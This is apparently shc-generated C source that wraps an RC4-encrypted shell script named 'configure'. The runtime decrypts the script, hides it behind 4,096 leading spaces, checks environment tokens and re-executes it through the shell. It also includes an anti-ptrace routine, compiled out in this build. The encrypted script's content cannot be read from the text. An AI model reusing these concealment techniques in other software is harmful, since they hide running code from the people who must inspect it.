#if 0
	shc Version 3.8.9b, Generic Script Compiler
	Copyright (c) 1994-2015 Francisco Rosales <frosal@fi.upm.es>

	shc -f configure -r 
#endif

static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[4]))
	"\136\334\037\176\202\243\022\026\370\226\031\061\060\261\361\205"
	"\222\023\360\346\273\156\034\101"
#define      date_z	1
#define      date	((&data[24]))
	"\224"
#define      lsto_z	1
#define      lsto	((&data[25]))
	"\225"
#define      chk2_z	19
#define      chk2	((&data[30]))
	"\303\311\046\036\056\375\004\262\312\273\121\217\235\033\055\115"
	"\036\141\036\246\361\033\224"
#define      opts_z	1
#define      opts	((&data[49]))
	"\062"
#define      shll_z	14
#define      shll	((&data[51]))
	"\277\342\361\133\251\071\050\223\000\151\125\017\030\347\133\354"
	"\012"
#define      pswd_z	256
#define      pswd	((&data[122]))
	"\103\070\317\143\266\020\225\036\112\012\034\242\372\354\251\276"
	"\266\317\335\202\154\203\257\325\013\157\302\026\127\234\011\232"
	"\324\330\375\213\351\222\252\063\235\307\326\227\264\200\126\152"
	"\120\063\354\274\266\233\222\120\026\227\242\332\000\260\353\253"
	"\031\253\113\303\121\312\327\031\277\317\152\337\334\104\335\031"
	"\315\376\033\352\314\164\072\342\014\335\275\015\216\250\270\247"
	"\123\004\152\244\316\102\276\216\021\050\156\355\155\113\007\072"
	"\112\043\045\026\230\140\371\244\075\266\262\313\137\152\163\263"
	"\156\335\127\075\037\026\314\061\077\073\036\255\207\046\350\321"
	"\112\015\347\342\155\340\207\253\227\071\167\366\244\352\251\023"
	"\307\001\121\347\030\035\030\127\131\067\004\340\136\354\261\250"
	"\372\231\212\147\172\021\022\021\113\211\010\357\163\262\002\073"
	"\263\123\043\314\161\073\043\312\163\050\252\322\025\134\172\017"
	"\366\005\167\160\027\211\202\142\023\213\121\206\075\124\302\361"
	"\250\345\275\031\041\341\343\225\011\216\147\037\353\341\056\342"
	"\347\245\123\376\057\326\140\102\141\262\311\237\007\213\220\257"
	"\161\116\310\222\057\254\047\071\073\216\130\047\160\206\011\127"
	"\054\134\125\133\063\266\236\224\151\147\063\161\363\304\040\144"
	"\022\351\367\102\226\037\173\321\256\323\371\036\132\003\166\207"
	"\140\314\342\223\203\201\047\302\013\125\330\142\362\341\374\307"
	"\272\371\123\243\214\375\327\052\305\255\301\171\055\030\343\176"
	"\113\320\073\001\154\316\304\167\043\234\332\026\176\326\335\070"
	"\320\061\333\135\057\263\207\364\140\111\156\216\141\122\014\255"
	"\042\110\257\217"
#define      msg1_z	42
#define      msg1	((&data[443]))
	"\072\020\341\120\035\006\002\357\137\324\120\247\207\211\233\372"
	"\163\235\074\111\237\356\034\306\256\352\210\173\072\154\144\351"
	"\264\011\345\037\235\327\050\064\155\126\225\111\257\015"
#define      chk1_z	22
#define      chk1	((&data[489]))
	"\306\210\137\242\172\341\255\163\203\217\307\122\320\037\307\074"
	"\353\005\035\057\355\061\305\111\117\370\345"
#define      msg2_z	19
#define      msg2	((&data[513]))
	"\203\016\313\303\305\010\077\144\354\043\050\004\237\146\251\152"
	"\112\224\354\143\266\266"
#define      inlo_z	3
#define      inlo	((&data[534]))
	"\036\131\325"
#define      xecc_z	15
#define      xecc	((&data[538]))
	"\146\102\156\031\270\044\000\230\125\322\245\104\156\210\000\006"
	"\232\164\365"
#define      rlax_z	1
#define      rlax	((&data[556]))
	"\214"
#define      tst1_z	22
#define      tst1	((&data[562]))
	"\072\206\225\151\115\104\032\211\241\154\374\333\200\161\210\256"
	"\032\310\264\105\267\223\021\302\147\335\266\035\310\360\003\127"
#define      text_z	1529
#define      text	((&data[758]))
	"\375\047\314\102\100\017\224\006\165\057\172\153\337\142\147\311"
	"\133\104\004\342\331\156\057\367\067\040\372\216\147\153\151\144"
	"\223\065\247\324\105\074\332\273\153\124\047\113\267\216\025\022"
	"\323\032\365\255\210\044\244\277\105\237\116\254\012\270\021\236"
	"\356\271\162\063\366\115\357\142\241\026\255\131\245\302\154\170"
	"\335\141\045\145\206\311\045\314\150\164\171\163\054\213\022\032"
	"\104\205\116\072\322\075\234\164\124\112\316\371\015\072\161\352"
	"\234\227\117\043\140\165\357\311\351\151\075\025\364\120\060\071"
	"\325\176\164\247\273\020\034\020\133\352\011\150\045\173\122\301"
	"\022\242\345\163\027\325\075\001\076\173\027\063\313\107\154\241"
	"\305\340\111\201\361\145\221\114\117\017\022\370\223\053\337\241"
	"\010\200\073\034\174\166\213\323\160\131\270\232\307\207\220\270"
	"\047\053\215\065\220\256\034\162\305\301\323\235\340\374\146\326"
	"\263\061\245\140\024\364\373\025\044\227\376\015\205\006\024\315"
	"\076\160\332\363\104\352\134\117\105\026\125\126\157\365\306\021"
	"\276\303\216\161\016\152\020\066\344\136\016\200\267\015\062\302"
	"\262\337\151\223\122\111\140\262\330\364\224\006\132\356\034\211"
	"\147\075\047\346\114\335\250\242\030\201\175\157\276\221\114\122"
	"\224\010\066\304\335\033\140\241\361\167\045\042\117\214\036\327"
	"\000\323\042\210\300\126\246\005\217\354\305\333\347\053\163\037"
	"\351\105\133\074\232\123\233\231\005\076\114\200\175\070\255\372"
	"\246\336\033\123\072\166\065\153\064\324\306\351\216\124\077\021"
	"\017\015\003\163\302\311\262\347\122\056\001\020\005\207\171\161"
	"\215\267\062\340\075\211\301\332\134\130\143\377\044\223\201\252"
	"\217\307\303\167\302\125\373\226\106\126\046\205\366\067\032\065"
	"\215\054\023\024\224\152\065\031\041\043\163\316\213\211\133\355"
	"\022\171\257\205\312\272\026\037\267\374\051\123\214\044\101\373"
	"\167\336\156\065\073\036\252\036\160\133\310\366\151\231\210\150"
	"\124\360\116\131\341\005\103\114\375\243\337\367\363\144\367\110"
	"\042\173\232\016\122\175\113\372\212\017\263\124\173\207\105\240"
	"\272\112\210\355\212\320\223\126\042\003\236\177\145\101\327\103"
	"\357\245\172\271\111\306\316\230\152\204\265\314\100\134\073\032"
	"\203\346\220\041\100\025\201\334\264\046\233\167\002\252\311\237"
	"\374\334\130\274\372\271\051\155\346\200\337\347\222\111\132\170"
	"\250\111\357\120\206\067\050\323\346\377\256\005\356\105\016\257"
	"\273\164\111\031\212\101\361\267\100\355\060\121\114\016\032\220"
	"\160\067\232\345\324\045\372\355\127\046\234\241\263\331\141\255"
	"\144\156\363\037\255\361\122\266\043\054\126\225\255\215\226\145"
	"\112\145\324\033\316\163\251\234\003\271\266\052\340\217\121\367"
	"\307\124\040\057\231\221\241\041\371\054\264\133\054\265\015\347"
	"\016\143\064\174\306\125\071\310\330\160\275\050\255\012\117\156"
	"\142\174\273\375\234\172\012\063\275\033\056\220\050\020\357\357"
	"\003\074\211\116\026\022\052\224\217\031\327\231\067\224\222\315"
	"\004\322\226\026\307\307\256\002\264\177\347\043\053\254\010\070"
	"\372\144\314\024\340\301\053\163\355\375\370\151\164\075\117\326"
	"\033\345\107\364\160\240\361\252\274\167\051\342\037\330\311\344"
	"\061\373\035\127\136\011\172\350\305\363\010\320\026\025\014\236"
	"\122\132\012\156\274\343\067\041\103\371\244\172\341\116\167\040"
	"\332\200\110\013\035\034\362\233\042\250\137\013\025\161\347\306"
	"\061\264\122\143\047\150\374\235\157\354\122\151\357\225\264\157"
	"\056\276\215\210\020\154\044\133\154\114\122\227\106\304\314\246"
	"\112\031\272\263\015\375\035\025\363\247\133\244\001\351\367\330"
	"\262\303\136\377\364\237\146\177\142\176\076\244\107\357\332\152"
	"\224\051\233\373\367\246\353\304\312\360\351\114\104\001\044\033"
	"\224\263\363\316\243\173\274\176\334\112\202\354\075\011\273\026"
	"\270\216\031\066\125\372\344\225\336\201\216\121\363\262\210\125"
	"\323\301\235\274\310\143\064\303\361\273\111\076\375\214\137\335"
	"\003\210\210\042\245\140\344\357\146\315\005\126\333\050\320\024"
	"\350\204\006\337\351\164\073\324\310\123\305\372\313\120\230\001"
	"\126\031\352\070\367\140\163\254\322\236\376\216\372\024\226\346"
	"\252\255\105\022\061\045\061\106\351\303\120\203\372\107\323\130"
	"\162\144\330\251\255\326\207\176\250\222\341\214\142\252\072\145"
	"\112\326\254\251\102\105\174\245\010\074\221\034\374\326\240\317"
	"\370\251\256\370\101\112\111\305\257\044\365\206\154\207\061\341"
	"\030\016\340\136\324\270\020\127\124\070\363\145\316\302\265\320"
	"\070\376\050\160\154\012\365\253\341\253\152\105\300\145\114\372"
	"\014\167\061\146\260\235\112\146\346\224\217\355\032\353\260\075"
	"\060\205\231\321\354\071\060\363\371\106\014\267\152\107\333\270"
	"\310\152\300\311\125\001\076\144\071\373\157\350\173\263\206\035"
	"\007\177\315\060\215\231\353\001\254\073\263\360\051\254\265\354"
	"\055\016\232\273\033\166\105\163\215\337\240\354\165\177\064\007"
	"\372\121\043\246\221\333\003\047\176\136\231\200\334\163\225\245"
	"\104\154\065\130\032\020\100\161\242\121\105\166\102\214\114\252"
	"\213\136\173\003\244\253\125\314\230\350\145\150\210\123\177\102"
	"\067\016\070\116\363\012\364\224\056\271\066\262\057\244\121\230"
	"\315\032\271\314\305\124\010\110\137\117\256\352\214\211\121\045"
	"\022\342\047\362\106\360\113\143\342\254\010\160\107\024\305\315"
	"\255\376\373\131\065\203\350\221\147\106\306\025\267\027\106\032"
	"\230\336\121\132\323\074\160\201\070\033\224\204\140\065\027\126"
	"\040\353\310\047\250\031\340\153\154\342\042\267\353\255\053\024"
	"\370\376\166\114\047\044\346\147\334\006\057\160\342\074\227\340"
	"\051\354\347\356\357\003\266\037\023\232\154\034\040\073\006\276"
	"\375\331\254\211\240\037\013\105\163\352\174\025\212\035\055\024"
	"\324\042\100\014\354\040\325\157\377\227\133\371\062\126\173\117"
	"\242\227\022\241\151\103\052\320\347\003\216\333\137\311\034\222"
	"\011\236\211\350\204\107\245\301\073\344\105\157\071\373\052\230"
	"\273\301\054\210\001\064\272\355\212\210\067\203\120\250\076\211"
	"\066\176\134\354\201\375\345\045\066\213\207\156\007\336\162\300"
	"\104\110\306\260\143\153\001\357\356\214\053\042\354\251\255\212"
	"\360\065\206\333\073\152\131\301\270\341\131\060\362\227\360\366"
	"\325\147\337\120\313\056\221\335\245\022\366\232\310\341\057\236"
	"\204\061\031\012\250\204\004\073\167\203\072\251\046\030\014\131"
	"\224\227\055\130\246\264\240\252\247\354\144\246\336\030\126\371"
	"\176\243\366\204\020\246\103\323\137\237\101\317\065\353\064\311"
	"\365\275\266\272\252\224\203\077\054\263\117\234\031\111\067\221"
	"\154\050\005\311\202\070\367\247\170\114\354\350\172\307\145\323"
	"\262\030\142\111\144\077\066\150\313\074\112\215\044\034\060\171"
	"\021\347\122\072\074\255\063\020\242\356\325\242\276\027\065\362"
	"\340\060\012\365\142\366\036\105\211\112\111\051\041\163\356\013"
	"\316\034\226\262\140\243\023\167\116\174\365\142\130\131\277\350"
	"\316\326\134\250\257\053\135\013\262\223\350\003\330\067\141\040"
	"\071\043\357\007\270\133\135\065\151\041\352\360\176\141\066\143"
	"\035\171\160\233\035\245\233\103\375\037\327\072\372\345\077\272"
	"\105\143\030\077\131\343\025\301\356\046\011\201\263\350\324\162"
	"\144\077\137\311\212\301\360\126\332\125\104\331\273\371\203\302"
	"\133\327\034\125\100\053\343\012\013\146\331\352\321\031\227\034"
	"\351\154\233\265\165\027\007\067\051\252\034\235\302\362\333\303"
	"\060\126\332\144\042\041\320\304\347\260\015\150\241\163\371\356"
	"\303\225\243\070\254\253\157\326\125\213\163\030\176\117\333\256"
	"\246\266\023\310\330\343\215\277\223\233\050\065\016\041\044\321"
	"\267\307\011\143\163\171\071\311\005\255\341\203\374\275\062\242"
	"\164\105\153\114\050\371\014\274\224\064\362\242\126\026\164\015"
	"\336\176\161\121\367\252\033\375\130\374\200\125\272\263\367\056"
	"\370\143\173\041\135\210\336\361\274\320\224\023\347\010\041\305"
	"\206\222\027\176\075\062\173\225\057\374\352\351\257\342\030\247"
	"\106\223\311\243\033\247\224\330\167\050\354\136\060\015\044\267"
	"\237\074\066\334\156\261\161\236\256\134\210\135\076\240\005\204"
	"\064\316\050\120\165\274\050\355\345\024\114\026\042\160\315\301"
	"\255\003\235\034\265\017\272\144\154\102\301\252\343\306\057\027"
	"\225\127\147\012\024\220\370\371\245\104\017\307\265\335\210\142"
	"\341\046\177\227\066\071\373\242\174\274\115\137\203\174\166\030"
	"\324\335\043\350\155\033\342\023\140\361\332\026\317\142\171\260"
	"\211\370\107\300\061\102\142\256\377\257\015\202\054\203\232\001"
	"\141\276\352\317\331\314\342\072\276\274\120\215\037\311\075\251"
	"\301\205\151\363\307\314\241\306\174\256\111\251\062\344\252\224"
	"\242\224\144\174\141\106\266\037\003\007\255\043\320\353\315\222"
	"\160\067\206\070\003\047\376\177\326"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	0	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !defined(TRACEABLE)

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !defined(TRACEABLE) */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !defined(TRACEABLE)
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
